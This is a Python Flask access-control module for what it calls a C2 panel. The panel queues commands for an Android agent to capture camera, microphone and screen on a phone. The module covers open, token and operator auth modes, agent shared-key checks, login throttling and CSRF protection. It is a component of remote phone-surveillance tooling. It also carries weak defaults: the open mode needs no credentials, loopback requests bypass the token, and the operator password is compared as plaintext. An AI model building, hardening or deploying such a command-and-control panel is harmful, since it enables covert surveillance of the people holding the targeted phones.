"""Access control.

Three modes, selected by ``C2_AUTH``:

``open`` (default)
    Nothing is required. ``python3 app.py`` on loopback and the panel just
    works. Only correct while the port is reachable from localhost alone.

``token``
    Loopback requests stay open, so local use is still frictionless. Anything
    arriving from another address must present ``C2_ACCESS_TOKEN``, as a query
    parameter or an ``X-Access-Token`` header. This is the mode to use before
    putting the panel behind a tunnel or a reverse proxy — the panel queues
    commands that capture camera, microphone and screen on a phone that
    belongs to whoever is holding it.

``operator``
    Named accounts with passwords and CSRF (see :mod:`c2.operators`).

The loopback carve-out is deliberate. A tunnel or reverse proxy terminates on
localhost, so the *socket* always looks local; ``X-Forwarded-For`` is what
reveals the real origin, and it is only honoured when explicitly trusted.
"""

from __future__ import annotations

import hmac
import os
import secrets
import threading
import time
from functools import wraps

from flask import jsonify, redirect, request, session, url_for
from werkzeug.security import check_password_hash, generate_password_hash

from config import Config
from c2 import operators

_LOOPBACK = {"127.0.0.1", "::1", "localhost", ""}

_LOCK = threading.Lock()
_FAILURES: dict[str, list[float]] = {}

WINDOW_SECONDS = 300.0
BLOCK_SECONDS = 60.0

# Two thresholds on purpose.
#
# A single mistyped password five times in a row must not lock out every other
# operator sharing that machine, so the *name* bucket trips at a low count. A
# host spraying many different names gets a much larger budget before the IP
# bucket trips, which is what stops a distributed guessing run.
NAME_MAX_ATTEMPTS = 5
IP_MAX_ATTEMPTS = 25

# Trusted proxy, so X-Forwarded-For is believed. Set to the proxy's address.
# Without this a tunnel looks like loopback and the carve-out above would be
# useless, so set it whenever the panel is exposed.
TRUSTED_PROXY = os.environ.get("C2_TRUSTED_PROXY", "").strip()


# --------------------------------------------------------------------------
# Loopback / origin
# --------------------------------------------------------------------------


def _in_trusted_proxy() -> bool:
    return request.remote_addr in _LOOPBACK


def client_ip() -> str:
    """The real client address, honouring X-Forwarded-For only from a
    configured trusted proxy.

    A tunnel or reverse proxy terminates on localhost, so ``remote_addr`` alone
    would make every external request look local and silently defeat the
    loopback carve-out.
    """
    remote = request.remote_addr or "unknown"

    if _in_trusted_proxy() and TRUSTED_PROXY:
        forwarded = request.headers.get("X-Forwarded-For", "")
        if forwarded:
            return forwarded.split(",")[0].strip()

    return remote


def is_local_request() -> bool:
    """True when the request did not cross a network boundary."""
    if client_ip() in _LOOPBACK:
        return True
    return False


def _auth_mode() -> str:
    mode = (Config.AUTH_MODE or "open").lower()
    return mode if mode in ("open", "token", "operator") else "open"


def auth_mode() -> str:
    return _auth_mode()


# --------------------------------------------------------------------------
# Shared-key check (agents)
# --------------------------------------------------------------------------


def agent_key_ok(candidate: str | None) -> bool:
    """Constant-time comparison against the shared agent key."""
    if not candidate:
        return False
    expected = (Config.API_KEY or "").encode("utf-8")
    given = str(candidate).encode("utf-8")
    return hmac.compare_digest(given, expected)


def key_fingerprint(value: str | None) -> str:
    """Short, non-reversible tag so two processes can compare keys safely.

    Never log a key. When an agent refuses to connect the one question that
    matters is "is the key in the APK the same as the key the server
    expects", and two 8-character tags answer that without printing either
    secret. ``--------`` means no key arrived at all.
    """
    if not value:
        return "--------"
    import hashlib

    return hashlib.sha256(str(value).encode("utf-8")).hexdigest()[:8]


def access_token_ok(candidate: str | None) -> bool:
    """Constant-time check of the access token used in ``token`` mode."""
    expected = Config.ACCESS_TOKEN
    if not expected or not candidate:
        return False
    return hmac.compare_digest(str(candidate).encode("utf-8"),
                               expected.encode("utf-8"))


def presented_access_token() -> str | None:
    header = request.headers.get("X-Access-Token")
    if header:
        return header.strip()
    return (request.args.get("k") or "").strip() or None


# --------------------------------------------------------------------------
# Login throttling
# --------------------------------------------------------------------------


def _client_ip() -> str:
    return client_ip()


def _throttle_buckets() -> list[tuple[str, int]]:
    """(bucket key, attempt budget) pairs covering source and claimed name.

    Neither is sufficient alone: name-only lets an attacker lock a known
    account from anywhere, IP-only lets one careless typist lock out everyone
    behind the same address.
    """
    buckets: list[tuple[str, int]] = [(f"ip:{_client_ip()}", IP_MAX_ATTEMPTS)]

    name = request.form.get("name") or request.headers.get("X-Operator-Name")
    if name:
        buckets.append((operators.throttle_key(name, _client_ip()),
                        NAME_MAX_ATTEMPTS))
    return buckets


def _prune(ip: str, now: float) -> list[float]:
    return [t for t in _FAILURES.get(ip, []) if now - t < WINDOW_SECONDS]


def record_failure() -> None:
    with _LOCK:
        now = time.monotonic()
        for bucket, _limit in _throttle_buckets():
            hits = _prune(bucket, now)
            hits.append(now)
            _FAILURES[bucket] = hits


def clear_failures() -> None:
    with _LOCK:
        for bucket, _limit in _throttle_buckets():
            _FAILURES.pop(bucket, None)


def blocked_for() -> float:
    """Seconds remaining in the block window, or 0.

    The largest remaining block across every relevant bucket wins, so a
    successful clear of the IP bucket does not bypass a name-based block.
    """
    with _LOCK:
        now = time.monotonic()
        remaining = 0.0
        for bucket, limit in _throttle_buckets():
            hits = _prune(bucket, now)
            _FAILURES[bucket] = hits
            if len(hits) >= limit:
                remaining = max(remaining, BLOCK_SECONDS - (now - hits[0]))
        return max(0.0, remaining)


# --------------------------------------------------------------------------
# Session helpers (operator mode)
# --------------------------------------------------------------------------


def bearer_token() -> str | None:
    """Token from an Authorization header, if the request carries one."""
    header = request.headers.get("Authorization", "")
    if not header:
        return None
    scheme, _, value = header.partition(" ")
    if scheme.lower() != "bearer":
        return None
    return value.strip() or None


def token_operator():
    """Operator resolved from a bearer token, or None.

    Machine clients (the Telegram bridge, scripts) use this instead of a
    browser session. Looked up on every request rather than cached in the
    session so that revoking a token takes effect immediately.
    """
    if _auth_mode() != "operator":
        return None
    return operators.verify_token(bearer_token())


def csrf_token() -> str:
    token = session.get("_csrf")
    if not token:
        token = secrets.token_urlsafe(32)
        session["_csrf"] = token
    return token


def verify_password(candidate: str) -> bool:
    """Constant-time compare against the configured operator password.

    The password is held as plaintext in Config (it comes from the
    environment or a 0600 file), so a constant-time string compare is both
    correct and cheaper than a KDF on every request.
    """
    if not candidate:
        return False
    expected = (Config.OPERATOR_PASSWORD or "").encode("utf-8")
    given = candidate.encode("utf-8")
    return hmac.compare_digest(given, expected)


def is_authenticated() -> bool:
    mode = _auth_mode()

    if mode == "open":
        return True

    if mode == "token":
        if is_local_request():
            return True
        return access_token_ok(presented_access_token())

    # operator
    if session.get("operator"):
        return True
    return token_operator() is not None


def current_operator_name() -> str | None:
    return session.get("operator_id") or session.get("operator_name")


def require_role(*roles):
    """Guard for routes that only some roles may reach."""

    def decorator(view):
        @wraps(view)
        def wrapper(*args, **kwargs):
            role = session.get("operator_role", "viewer")
            if role not in roles:
                return jsonify({"error": "forbidden", "detail": "role"}), 403
            return view(*args, **kwargs)

        return wrapper

    return decorator


# --------------------------------------------------------------------------
# Decorators
# --------------------------------------------------------------------------


def _wants_json() -> bool:
    if request.path.startswith("/api/"):
        return True
    accept = request.headers.get("Accept", "")
    return "application/json" in accept and "text/html" not in accept


def operator_required(view):
    """Require access. Honours the configured auth mode.

    In ``open`` mode this is a no-op. In ``token`` mode a local request
    passes and a remote one needs the token. In ``operator`` mode an HTML page
    is redirected to the login form while an API call gets a 401.
    """

    @wraps(view)
    def wrapper(*args, **kwargs):
        if is_authenticated():
            return view(*args, **kwargs)

        if _auth_mode() == "operator" and _wants_json():
            return jsonify({"error": "unauthorized"}), 401
        if _auth_mode() == "operator":
            return redirect(url_for("login", next=request.path))
        return jsonify({"error": "token_required",
                        "detail": "present C2_ACCESS_TOKEN as ?k= or "
                                  "X-Access-Token"}), 401

    return wrapper


def csrf_protect(view):
    """Require a matching X-CSRF-Token on state-changing requests.

    Only relevant in ``operator`` mode. A cookie is an ambient credential: a
    cross-site form can make the browser attach it, which is what CSRF defends
    against. A bearer token is never attached automatically, so a token caller
    is not forgeable and demanding a CSRF token would only break legitimate
    machine clients like the Telegram bridge.
    """

    @wraps(view)
    def wrapper(*args, **kwargs):
        if _auth_mode() != "operator":
            return view(*args, **kwargs)

        if request.method in ("GET", "HEAD", "OPTIONS"):
            return view(*args, **kwargs)
        if not is_authenticated():
            return _deny()
        if token_operator() is not None:
            return view(*args, **kwargs)

        sent = request.headers.get("X-CSRF-Token", "")
        expected = session.get("_csrf", "")
        if not sent or not expected or not hmac.compare_digest(
            sent.encode("utf-8"), expected.encode("utf-8")
        ):
            return _deny()
        return view(*args, **kwargs)

    return wrapper


def _deny():
    if _wants_json():
        return jsonify({"error": "forbidden", "detail": "csrf"}), 403
    return redirect(url_for("login"))


def auth_status() -> dict:
    """For /api/session and the startup banner."""
    mode = _auth_mode()
    return {
        "mode": mode,
        "authenticated": is_authenticated(),
        "local": is_local_request(),
        "operator": current_operator_name(),
        "role": session.get("operator_role"),
        "csrf_token": csrf_token() if mode == "operator" and is_authenticated() else None,
    }
